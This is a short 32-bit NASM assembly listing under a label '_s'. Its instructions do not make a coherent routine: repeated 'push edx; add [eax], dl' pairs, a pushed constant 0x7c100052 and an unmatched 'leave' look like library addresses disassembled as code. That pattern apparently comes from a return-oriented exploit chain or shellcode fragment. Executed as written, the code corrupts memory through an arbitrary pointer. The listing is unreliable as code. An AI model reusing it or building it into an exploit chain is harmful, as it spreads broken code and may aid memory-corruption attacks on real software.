BITS 32
SEGMENT .text

_s:
    xchg ebp, eax
    inc eax
    push edx
    add [eax], dl
    mov edi, edi
    push eax
    push edx
    add [eax], dl
    pop eax
    push edx
    add [eax], dl
    push dword 0x7c100052
    push edx
    add [eax], dl
    mov eax, [ebp+0x8]
    pop esi
    pop edi
    leave
    ret
